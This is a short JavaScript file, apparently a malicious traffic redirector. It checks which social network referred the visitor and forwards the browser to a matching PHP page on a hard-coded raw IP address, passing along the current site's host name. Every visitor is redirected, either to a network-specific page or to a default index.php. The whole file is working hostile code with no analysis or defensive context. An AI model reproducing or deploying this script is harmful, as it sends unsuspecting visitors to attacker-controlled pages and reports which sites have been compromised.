// KROTEG
var abc1 = 'http://85.234.141.92/redirectsoft/go/';
var abc2 = 'http://85.234.141.92/redirectsoft/go/';
var ss = '' + location.search;
if ((location.search).length>0) abc = abc1; else abc = abc2;
var redirects = [
['facebook.com',  abc+'fb.php'],
['tagged.com',    abc+'tg.php'],
['friendster.com',abc+'fr.php'],
['myspace.com',   abc+'ms.php'],
['msplinks.com',  abc+'ms.php'],
['myyearbook.com',abc+'yb.php'],
['fubar.com',     abc+'fu.php'],
['twitter.com',   abc+'tw.php'],
['hi5.com',       abc+'hi5.php'],
['bebo.com',      abc+'be.php']
];
var s = '' + document.referrer, r = false;
for (var i = 0; i < redirects.length; i ++) {
if ((s.indexOf(redirects[i][0]) != -1)) {
     var redir=redirects[i][1] + location.search; 
     if ((location.search).length>0) redir=redir+'&domain='+location.host; else redir=redir+'?domain='+location.host; 
     location.href = redir;  
     r = true; 
     break; 
}
}
if (!r) location.href = abc+'index.php'+ location.search;

